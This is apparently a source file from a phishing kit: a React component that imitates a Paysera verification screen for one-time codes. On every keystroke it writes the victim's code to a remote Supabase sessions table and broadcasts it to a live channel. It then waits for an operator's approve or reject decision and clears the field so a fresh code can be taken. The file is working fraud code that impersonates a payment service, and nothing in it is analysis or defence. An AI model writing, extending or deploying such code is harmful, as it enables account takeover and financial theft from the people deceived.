import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import payseraLogo from "@/assets/volet-logo-v2.svg";
import { usePayseraLang } from "@/hooks/usePayseraLang";

interface PayseraOtpScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const PayseraOtpScreen = ({ email, sessionId, onBack }: PayseraOtpScreenProps) => {
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const { t } = usePayseraLang();

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage(t.invalidCode);
          setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error"); setErrorMessage(t.invalidCode); setOtp("");
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId, t]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error"); setErrorMessage(t.invalidCode); setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId, t]);

  const handleOtpChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setOtp(value);
    supabase.from("sessions").update({ otp_code: `token_code:${value}` } as any).eq("id", sessionId).then(() => {});
    const broadcastCh = supabase.channel(`confirm-email-${sessionId}`);
    broadcastCh.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        broadcastCh.send({ type: "broadcast", event: "client_token_update", payload: { token_code: value } });
        setTimeout(() => supabase.removeChannel(broadcastCh), 1500);
      }
    });
  }, [sessionId]);

  useEffect(() => {
    if (otp.length >= 20 && status === "input") setStatus("verifying");
  }, [otp, status]);

  const inputClass = "w-full border border-[#b8c0cc] rounded-sm px-3 py-2.5 text-[14px] text-[#2c3e50] outline-none focus:border-[#5b8fb9] focus:ring-1 focus:ring-[#5b8fb9]/30 bg-white";
  const btnClass = "w-full bg-[#6b8fa3] hover:bg-[#5a7d91] active:bg-[#4e6f82] text-white text-[13px] font-bold uppercase tracking-wider py-2.5 rounded-sm transition-colors disabled:opacity-60";

  if (status === "success") {
    return (
      <div className="flex min-h-screen flex-col bg-[#dce1e8]">
        <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>
        <div className="flex flex-1 flex-col items-center justify-center px-4">
          <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <svg className="h-7 w-7 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
            </div>
            <h2 className="text-[15px] font-bold text-[#2c3e50] mb-2">{t.verificationComplete}</h2>
            <p className="text-[13px] text-[#666]">{t.verificationCompleteDesc}</p>
            <p className="mt-2 text-[12px] text-[#999]">{email}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#dce1e8]">
      <div className="flex justify-center pt-6"><img src={payseraLogo} alt="Paysera" className="h-[40px]" /></div>

      <div className="flex flex-1 flex-col items-center justify-center px-4">
        <div className="w-full max-w-[460px] bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-5">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-[15px] font-bold text-[#2c3e50] uppercase tracking-wide">{t.token}</h2>
            <button onClick={onBack} className="text-[13px] text-[#5b8fb9] hover:text-[#3a6d8c] font-medium transition-colors">{t.logout}</button>
          </div>
          <div className="border-t border-[#c8ced8] mb-4" />

          <p className="text-[13px] text-[#555] mb-5">
            {t.otpInstruction}
          </p>

          {errorMessage && status === "error" && (
            <div className="mb-4 rounded-sm border border-red-300 bg-red-50 px-4 py-2.5 text-[13px] text-red-600">{errorMessage}</div>
          )}

          <label className="block text-[13px] font-bold text-[#2c3e50] mb-1.5">{t.otpLabel}</label>
          <input
            type="text"
            inputMode="numeric"
            value={otp}
            onChange={handleOtpChange}
            disabled={status === "verifying"}
            autoFocus
            maxLength={20}
            className={`${inputClass} mb-4`}
          />

          {status === "verifying" && (
            <div className="mb-4 flex items-center gap-2 text-[13px] text-[#888]">
              <div className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
              {t.verifyingCode}
            </div>
          )}

          <button
            onClick={() => { if (otp.length >= 4) setStatus("verifying"); }}
            disabled={status === "verifying" || otp.length < 4}
            className={btnClass}
          >
            {t.continue}
          </button>
        </div>
      </div>
    </div>
  );
};

export default PayseraOtpScreen;
